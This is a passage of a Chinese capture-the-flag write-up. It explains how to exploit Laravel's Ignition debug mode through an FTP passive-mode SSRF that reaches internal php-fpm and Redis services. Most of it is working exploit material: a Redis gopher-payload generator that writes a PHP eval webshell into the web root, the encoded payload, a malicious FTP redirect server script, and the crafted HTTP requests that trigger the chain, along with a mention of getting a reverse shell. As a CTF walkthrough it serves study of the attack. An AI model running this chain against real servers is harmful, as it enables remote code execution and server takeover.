            conn.send(b"150 \n")
            print(conn.recv(20))
            exit()
        # 第一次连接是下载文件，需要告诉客户端下载已经结束
        if count == 1:
            conn.send(b"226 \n")
        conn.close()
        count += 1
运行上述脚本，一个恶意ftp服务就起来了：
这个脚本做的事情很简单，就是当客户端第一次连接的时候返回我们预设的payload；当客户端第二次连接的时候将客户端的连接重定向到
127.0.0.1:9000，也就是目标主机上 php-fpm 服务的端口，从而造成 SSRF，攻击其 php-fpm。
最后，构造如下请求，即可触发攻击并反弹 Shell：
    POST /_ignition/execute-solution HTTP/1.1
    Host: 192.168.1.12:8000
    Content-Type: application/json
    Content-Length: 189
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "ftp://aaa@192.168.1.7:23/123"
      }
    }
###  [2021 羊城杯CTF]Cross The Side
进入题目，又是 Laravel：
根据 Laravel 的版本猜测应该是 Laravel Debug mode RCE，但是尝试 Debug RCE
并没有成功，可能是日志文件太大的原因。然后端口扫描发现其本地 6379 端口上有一个 Redis，猜测本题应该是通过 FTP 被动模式打内网的
Redis。参照前面所讲的原理，直接打就行了。
首先生成攻击 Redis 的 Gophar Payload：
    import urllib
    protocol="gopher://"
    ip="127.0.0.1"
    port="6379"
    shell="\n\n\n\n"
    filename="shell.php"
    path="/var/www/html"
    passwd=""    # 此处也可以填入Redis的密码, 在不存在Redis未授权的情况下适用
    cmd=["flushall",
         "set 1 {}".format(shell.replace(" ","${IFS}")),
         "config set dir {}".format(path),
         "config set dbfilename {}".format(filename),
         "save"
         ]
    if passwd:
        cmd.insert(0,"AUTH {}".format(passwd))
    payload=protocol+ip+":"+port+"/_"
    def redis_format(arr):
        CRLF="\r\n"
        redis_arr = arr.split(" ")
        cmd=""
        cmd+="*"+str(len(redis_arr))
        for x in redis_arr:
            cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
        cmd+=CRLF
        return cmd
    if __name__=="__main__":
        for x in cmd:
            payload += urllib.quote(redis_format(x))
        print payload
生成的 payload 只取 `_` 后面的数据部分：
    %2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2435%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%22whoami%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2420%0D%0A/var/www/html/public%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
然后在攻击机上搭建一个恶意的 FTP 服务，并将上面的 Payload 中的数据替换掉下面 FTP 脚本中的 Payload 的内容：
    # -*- coding: utf-8 -*-    # @Time    : 2021/1/13 6:56 下午
    # @Author  : tntaxin
    # @File    : ftp_redirect.py
    # @Software:
    import socket
    from urllib.parse import unquote
    # 对gopherus生成的payload进行一次urldecode
    payload = unquote("%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2435%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%22whoami%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2420%0D%0A/var/www/html/public%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A")
    payload = payload.encode('utf-8')
    host = '0.0.0.0'
    port = 23
    sk = socket.socket()
    sk.bind((host, port))
    sk.listen(5)
    # ftp被动模式的passvie port,监听到1234
    sk2 = socket.socket()
    sk2.bind((host, 2333))
    sk2.listen()
    # 计数器，用于区分是第几次ftp连接
    count = 1
    while 1:
        conn, address = sk.accept()
        conn.send(b"200 \n")
        print(conn.recv(20))  # USER aaa\r\n  客户端传来用户名
        if count == 1:
            conn.send(b"220 ready\n")
        else:
            conn.send(b"200 ready\n")
        print(conn.recv(20))   # TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本
        if count == 1:
            conn.send(b"215 \n")
        else:
            conn.send(b"200 \n")
        print(conn.recv(20))  # SIZE /123\r\n  客户端询问文件/123的大小
        if count == 1:
            conn.send(b"213 3 \n")
        else:
            conn.send(b"300 \n")
        print(conn.recv(20))  # EPSV\r\n'
        conn.send(b"200 \n")
        print(conn.recv(20))   # PASV\r\n  客户端告诉服务端进入被动连接模式
        if count == 1:
            conn.send(b"227 47,101,57,72,0,2333\n")  # 服务端告诉客户端需要到那个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234
        else:
            conn.send(b"227 127,0,0,1,0,6379\n")  # 端口计算规则：35*256+40=9000
        print(conn.recv(20))  # 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n
        if count == 1:
            conn.send(b"125 \n") # 告诉客户端可以开始数据链接了
            # 新建一个socket给服务端返回我们的payload
            print("建立连接!")
            conn2, address2 = sk2.accept()
            conn2.send(payload)
            conn2.close()
            print("断开连接!")
        else:
            conn.send(b"150 \n")
            print(conn.recv(20))
            exit()
        # 第一次连接是下载文件，需要告诉客户端下载已经结束
        if count == 1:
            conn.send(b"226 \n")
        conn.close()
        count += 1
这个脚本做的事情很简单，就是当客户端第一次连接的时候返回我们预设的 Payload；当客户端第二次连接的时候将客户端的连接重定向到
127.0.0.1:6379，也就是目标主机上 Redis 服务的端口，从而造成 SSRF，攻击其 Redis。
运行 ftp_redirect.py：
然后发送请求就行了：
    POST /_ignition/execute-solution HTTP/1.1
    Host: 192.168.41.107:8077
    Content-Type: application/json
    Content-Length: 190
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "ftp://PI:EMAIL:23/123"
      }
    }
执行后，成功写入 Webshell，然后读取 flag 就行了：